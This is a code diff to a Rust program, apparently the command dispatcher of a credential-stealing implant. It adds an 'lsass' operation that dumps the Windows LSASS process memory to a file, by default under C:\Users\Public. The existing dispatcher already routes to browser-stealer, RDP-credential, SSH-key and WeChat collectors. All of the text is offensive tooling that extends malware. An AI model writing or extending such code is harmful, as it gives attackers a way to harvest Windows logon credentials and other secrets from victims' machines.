@@ -6,6 +6,7 @@ mod browser_stealer;
 mod rdp_creds;
 mod ssh_keys;
 mod other_software;
+mod lsass;
 
 use serde_json::Value;
 
@@ -50,6 +51,12 @@ fn dispatch(input: &str) -> String {
         "wechat" => other_software::OtherSoftware::collect_wechat(),
         "ssh" => ssh_keys::SshKeys::collect(),
         "rdp" => rdp_creds::RdpCreds::collect(),
+        "lsass" => {
+            let path = v.get("path")
+                .and_then(|p| p.as_str())
+                .unwrap_or("C:\\Users\\Public\\lsass.dmp");
+            lsass::dump_lsass(path)
+        }
         _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
     }
 }
